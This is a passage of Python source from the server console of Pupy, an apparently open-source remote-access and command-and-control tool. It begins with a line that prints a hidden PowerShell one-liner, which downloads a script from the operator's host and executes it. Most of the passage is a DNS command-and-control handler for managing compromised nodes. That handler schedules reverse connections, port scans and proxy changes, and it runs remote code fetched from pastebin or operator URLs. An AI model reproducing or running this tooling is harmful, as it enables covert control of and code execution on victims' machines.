                self.display_success("ONELINER: powershell.exe -w hidden -noni -nop -c \"iex(New-Object System.Net.WebClient).DownloadString('http://{}/{}')\"".format(host, wwwpath))

    def do_dnscnc(self, arg):
        """ DNSCNC commands """
        if not self.dnscnc:
            self.display_error('DNSCNC disabled')
            return

        arg_parser = PupyArgumentParser(
            prog='dnscnc', description=self.do_dnscnc.__doc__)
        arg_parser.add_argument('-n', '--node', help='Send command only to this node (or session)')
        arg_parser.add_argument('-d', '--default', action='store_true', default=False,
                                 help='Set command as default for new connections')

        commands = arg_parser.add_subparsers(title='commands', dest='command')
        status = commands.add_parser('status', help='DNSCNC status')
        clist = commands.add_parser('list', help='List known DNSCNC clients')

        info = commands.add_parser('info', help='List known DNSCNC clients system status')

        policy = commands.add_parser('set', help='Change policy (polling, timeout)')
        policy.add_argument('-p', '--poll', help='Set poll interval', type=int)
        policy.add_argument('-k', '--kex', type=bool, help='Enable KEX')
        policy.add_argument('-t', '--timeout', type=int, help='Set session timeout')

        connect = commands.add_parser('connect', help='Request reverse connection')
        connect.add_argument('-c', '--host', help='Manually specify external IP address for connection')
        connect.add_argument('-p', '--port', help='Manually specify external PORT for connection')
        connect.add_argument('-t', '--transport', help='Manually specify transport for connection')

        reset = commands.add_parser('reset', help='Reset scheduled commands')
        disconnect = commands.add_parser('disconnect', help='Request disconnection')

        reexec = commands.add_parser('reexec', help='Try to reexec module')

        onlinestatus = commands.add_parser('onlinestatus', help='Try to check network ability (warning: noisy)')

        extra = commands.add_parser('extra', help='Get extra info from session (cyan colored)')

        scan = commands.add_parser('scan', help='Try to connect to remote host ports (range)')
        scan.add_argument('host', type=str, help='Host')
        scan.add_argument('first', type=int, help='First port in range')
        scan.add_argument('last', type=int, nargs='?', help='Last port in range')

        sleep = commands.add_parser('sleep', help='Postpone any activity')
        sleep.add_argument('-t', '--timeout', default=10, type=int, help='Timeout (seconds)')

        pastelink = commands.add_parser('pastelink', help='Execute code by link to pastebin service')
        pastelink.add_argument('-a', '--action', choices=['exec', 'pyexec', 'sh'], default='pyexec',
                                   help='Action - execute as executable, or evaluate as python/sh code')
        pastelink_src = pastelink.add_mutually_exclusive_group(required=True)
        pastelink_src.add_argument('-c', '--create', help='Create new pastelink from file')
        pastelink_src.add_argument('-u', '--url', help='Specify existing URL')

        dexec = commands.add_parser('dexec', help='Execute code by link to service controlled by you')
        dexec.add_argument('-a', '--action', choices=['exec', 'pyexec', 'sh'], default='pyexec',
                                   help='Action - execute as executable, or evaluate as python/sh code')
        dexec.add_argument('-u', '--url', required=True, help='URL to data')
        dexec.add_argument('-p', '--proxy', action='store_true', default=False,
                               help='Ask to use system proxy (http/https only)')

        proxy = commands.add_parser('proxy', help='Set connection proxy')
        proxy.add_argument('uri', help='URI. Example: http://user:password@192.168.0.1:3128 or none')

        exit = commands.add_parser('exit', help='Request exit')

        try:
            args = arg_parser.parse_args(shlex.split(arg))
        except PupyModuleExit:
            return

        if args.command == 'status':
            policy = self.dnscnc.policy
            objects = {
                'DOMAIN': self.dnscnc.dns_domain,
                'DNS PORT': str(self.dnscnc.dns_port),
                'RECURSOR': self.dnscnc.dns_recursor,
                'LISTEN': str(self.dnscnc.dns_listen),
                'SESSIONS': 'TOTAL={} DIRTY={}'.format(
                    self.dnscnc.count, self.dnscnc.dirty
                ),
                'POLL': '{}s'.format(policy['interval']),
                'TIMEOUT': '{}s'.format(policy['timeout']),
                'KEX': '{}'.format(bool(policy['kex'])),
            }

            self.display(PupyCmd.table_format([
                {'PROPERTY':k, 'VALUE':v} for k,v in objects.iteritems()
            ]))

            if self.dnscnc.commands:
                self.display('\nDEFAULT COMMANDS:\n'+'\n'.join([
                    '{:03d} {}'.format(i, cmd) for i, cmd in enumerate(self.dnscnc.commands)
                ]))

        elif args.command == 'info':
            sessions = self.dnscnc.list(args.node)
            if not sessions:
                self.display_success('No active DNSCNC sesisons found')
                return

            objects = []

            for idx, session in enumerate(sessions):
                if not ( session.system_status and session.system_info ):
                    continue

                object = {
                    '#': '{:03d}'.format(idx),
                    'P': '',
                    'NODE': '{:012x}'.format(session.system_info['node']),
                    'SESSION': '{:08x}'.format(session.spi),
                    'IP': session.system_info['external_ip'] or '?',
                    'OS': '{}/{}'.format(
                        session.system_info['os'],
                        session.system_info['arch']
                    ),
                    'CPU': '{:d}%'.format(session.system_status['cpu']),
                    'MEM': '{:d}%'.format(session.system_status['mem']),
                    'LIS': '{:d}'.format(session.system_status['listen']),
                    'EST': '{:d}'.format(session.system_status['remote']),
                    'USERS': '{:d}'.format(session.system_status['users']),
                    'IDLE': '{}'.format(session.system_status['idle']),
                    'TAGS': '{}'.format(self.config.tags(session.system_info['node']))
                }

                pupy_session = None
                for c in self.pupsrv.clients:
                    if 'spi' in c.desc:
                        if c.desc['spi'] == '{:08x}'.format(session.spi):
                            pupy_session = c.desc['id']
                    elif c.node() == '{:012x}'.format(session.system_info['node']):
                        pupy_session = c.desc['id']
                        break

                color = ''
                if pupy_session:
                    object.update({
                        'P': pupy_session
                    })
                    color = 'lightgreen'
                elif not session.system_status['idle']:
                    color = 'lightyellow'
                elif session.system_status['cpu'] > 90 or session.system_status['mem'] > 90:
                    color = 'lightred'
                elif (session.online_status or session.egress_ports or session.open_ports):
                    color = 'cyan'

                if color:
                    object = { k:colorize(v, color) for k,v in object.iteritems() }

                objects.append(object)

            columns = [
                '#', 'P', 'NODE', 'SESSION', 'IP', 'OS',
                'CPU', 'MEM', 'LIS', 'EST', 'USERS', 'IDLE', 'TAGS'
            ]

            self.display(
                PupyCmd.table_format(objects, wl=columns)
            )

        elif args.command == 'list':
            sessions = self.dnscnc.list(args.node)
            if not sessions:
                self.display_success('No active DNSCNC sesisons found')
                return

            objects = []

            for idx, session in enumerate(sessions):
                object = {
                    '#': '{:03d}'.format(idx),
                    'P': '',
                    'NODE': '{:012x}'.format(session.system_info['node']),
                    'SESSION': '{:08x}'.format(session.spi),
                    'EXTERNAL IP': '{}'.format(
                        session.system_info['external_ip'] or '?'
                    ),
                    'ONLINE': '{}'.format(
                        'Y' if session.system_info['internet'] else 'N'
                    ),
                    'IDLE': '{}s'.format(session.idle),
                    'DURATION': '{}s'.format(session.duration),
                    'OS': '{}/{}'.format(
                        session.system_info['os'],
                        session.system_info['arch']
                    ),
                    'BOOTED': '{}s'.format(
                        session.system_info['boottime'].ctime() if \
                        session.system_info['boottime'] else '?'
                    ),
                    'CMDS': '{}'.format(len(session.commands))
                }

                pupy_session = None
                for c in self.pupsrv.clients:
                    if 'spi' in c.desc:
                        if c.desc['spi'] == '{:08x}'.format(session.spi):
                            pupy_session = c.desc['id']
                    elif c.node() == '{:012x}'.format(session.system_info['node']):
                        pupy_session = c.desc['id']
                        break

                color = None

                if pupy_session:
                    object.update({
                        'P': pupy_session
                    })
                    color = 'lightgreen'
                elif session.idle > self.dnscnc.policy['interval']:
                    color = 'grey'
                elif not session.system_info['internet']:
                    color = 'lightred'
                elif len(session.commands) > 0:
                    color = 'yellow'

                if color:
                    object = { k:colorize(v, color) for k,v in object.iteritems() }

                objects.append(object)

            columns = [
                '#', 'P', 'NODE', 'SESSION', 'OS', 'ONLINE',
                'EXTERNAL IP', 'IDLE', 'DURATION', 'BOOTED', 'CMDS'
            ]

            self.display(
                PupyCmd.table_format(objects, wl=columns)
            )

        elif args.command == 'set':
            if all([x is None for x in [args.kex, args.timeout, args.poll]]):
                self.display_error('No arguments provided.')
            else:
                count = self.dnscnc.set_policy(args.kex, args.timeout, args.poll, node=args.node)
                if count:
                    self.display_success('Apply policy to {} known nodes'.format(count))

        elif args.command == 'reset':
            count = self.dnscnc.reset(
                session=args.node,
                default=args.default
            )

            if count:
                self.display_success('Reset commands on {} known nodes'.format(count))
            elif args.node:
                self.display_error('Node {} not found'.format(args.node))

        elif args.command == 'connect':
            count = self.dnscnc.connect(
                host=args.host,
                port=args.port,
                transport=args.transport,
                node=args.node,
                default=args.default
            )

            if count:
                self.display_success('Schedule connect {} known nodes'.format(count))
            elif args.node:
                self.display_error('Node {} not found'.format(args.node))

        elif args.command == 'onlinestatus':
            count = self.dnscnc.onlinestatus(node=args.node, default=args.default)

            if count:
                self.display_success('Schedule online status request to {} known nodes'.format(count))
            elif args.node:
                self.display_error('Node {} not found'.format(args.node))

        elif args.command == 'scan':
            count = self.dnscnc.scan(
                args.host, args.first, args.last or args.first,
                node=args.node, default=args.default
            )

            if count:
                self.display_success('Schedule online status request to {} known nodes'.format(count))
            elif args.node:
                self.display_error('Node {} not found'.format(args.node))

        elif args.command == 'disconnect':
            count = self.dnscnc.disconnect(
                node=args.node,
                default=args.default
            )

            if count:
                self.display_success('Schedule disconnect to {} known nodes'.format(count))
            elif args.node:
                self.display_error('Node {} not found'.format(args.node))

        elif args.command == 'exit':
            count = self.dnscnc.exit(
                node=args.node,
                default=args.default
            )

            if count:
                self.display_success('Schedule exit to {} known nodes'.format(count))
            elif args.node:
                self.display_error('Node {} not found'.format(args.node))

        elif args.command == 'reexec':
            count = self.dnscnc.reexec(
                node=args.node,
                default=args.default
            )

            if count:
                self.display_success('Schedule reexec to {} known nodes'.format(count))
            elif args.node:
                self.display_error('Node {} not found'.format(args.node))

        elif args.command == 'sleep':
            count = self.dnscnc.sleep(
                args.timeout,
                node=args.node,
                default=args.default
            )

            if count:
                self.display_success('Schedule sleep to {} known nodes'.format(count))
            elif args.node:
                self.display_error('Node {} not found'.format(args.node))

        elif args.command == 'proxy':
            count = self.dnscnc.proxy(
                args.uri,
                node=args.node,
                default=args.default
            )

            if count:
                self.display_success('Schedule sleep to {} known nodes'.format(count))
            elif args.node:
                self.display_error('Node {} not found'.format(args.node))

        elif args.command == 'dexec':
            count = self.dnscnc.dexec(
                args.url,
                args.action,
                proxy=args.proxy,
                node=args.node,
                default=args.default
            )

            if count:
                self.display_success('Schedule sleep to {} known nodes'.format(count))
            elif args.node:
                self.display_error('Node {} not found'.format(args.node))

        elif args.command == 'pastelink':
            try:
                count, url = self.dnscnc.pastelink(
                    args.url,
                    args.action,
                    proxy=args.proxy,
                    node=args.node,
                    default=args.default
                )

                self.display_success('URL: {}'.format(url))

                if count:
                    self.display_success('Schedule exit to {} known nodes'.format(count))
                elif args.node:
                    self.display_error('Node {} not found'.format(args.node))

            except ValueError as e:
                self.display_error('{}'.format(e))

        elif args.command == 'extra':
            sessions = self.dnscnc.list(args.node)
            if not sessions:
                self.display_error('No sessions found')
                return
            elif len(sessions) > 1:
                self.display_error('Selected more than one sessions')
                return

            session = sessions[0]

            if session.online_status:
                self.display('\nONLINE STATUS\n')
                objects = [
                    {
                        'KEY':colorize(
                            k.upper().replace('-', ' '),
                            'green' if session.online_status[k] else 'lightyellow'
                        ),
                        'VALUE':colorize(
                             str(session.online_status[k]).upper(),
                             'green' if session.online_status[k] else 'lightyellow'
                        )
                    } for k in [
                        'online', 'igd', 'hotspot', 'dns',
                        'direct-dns', 'http', 'https',
                        'https-no-cert', 'https-mitm', 'proxy',
                        'transparent-proxy'
                    ]
                ]

                self.display(PupyCmd.table_format(objects, wl=['KEY', 'VALUE']))

                self.display('\nPASTES STATUS\n')
                objects = [
                    {
                        'KEY': colorize(k, 'green' if v else 'lightyellow'),
                        'VALUE':colorize(v, 'green' if v else 'lightyellow')
                    } for k,v in session.online_status['pastebins'].iteritems()
                ]
                self.display(PupyCmd.table_format(objects, wl=['KEY', 'VALUE']))

                session.online_status = None

            if session.egress_ports:
                self.display('\nEGRESS PORTS: {}\n'.format(','.join(str(x) for x in session.egress_ports)))
                session.egress_ports = set()

            if session.open_ports:
                self.display('\nOPEN PORTS\n')
                objects = [
                    {
                        'IP': str(ip),
                        'PORTS': ','.join(str(x) for x in ports)
                    } for ip,ports in session.open_ports.iteritems()
                ]
                self.display(PupyCmd.table_format(objects, wl=['IP', 'PORTS']))
                session.open_ports = {}

    def do_exit(self, arg):
        """ Quit Pupy Shell """
        for job in self.pupsrv.jobs.itervalues():
            job.stop()

        if self.dnscnc:
            self.display_success('Stopping DNSCNC')
            self.dnscnc.stop()

        self.pupsrv.stop()
        return True

    def do_read(self, arg):
        """ execute a list of commands from a file """
        try:
            if not arg:
                self.display_error("usage: read <filename>")
                return
            with open(arg,'r') as f:
                self.cmdqueue.extend(f.read().splitlines())
        except Exception as e:
            self.display_error(str(e))

    def do_clear(self, arg):
        """ clears the screen """
        if sys.platform == 'win32':
            os.system('cls')
        else:
            os.system('clear')

    def _complete_path(self, path=None):
        "Perform completion of filesystem path."
        if not path:
            return os.listdir('.')
        dirname, rest = os.path.split(path)
        tmp = dirname if dirname else '.'
        res = [os.path.join(dirname, p)
                for p in os.listdir(tmp) if p.startswith(rest)]
        # more than one match, or single match which does not exist (typo)
        if len(res) > 1 or not os.path.exists(path):
            return res
        # resolved to a single directory, so return list of files below it
        if os.path.isdir(path):
            return [os.path.join(path, p) for p in os.listdir(path)]
        # exact file match terminates this completion
        return [path + ' ']

    def complete_read(self, text, line, begidx, endidx):
        tab = line.split(' ',1)
        if len(tab)>=2:
            return self._complete_path(tab[1])

class PupyCmdLoop(object):
    def __init__(self, pupyServer):
        self.cmd = PupyCmd(pupyServer)
        self.pupysrv = pupyServer
        self.stopped = Event()

    def loop(self):
        while not self.stopped.is_set() and not self.pupysrv.finished.is_set():
            try:
                self.cmd.cmdloop()
                self.stopped.set()
            except Exception as e:
                print(traceback.format_exc())
                time.sleep(0.1) #to avoid flood in case of exceptions in loop
                self.cmd.intro=''

        self.pupysrv.stop()

    def stop(self):
        self.stopped.set()
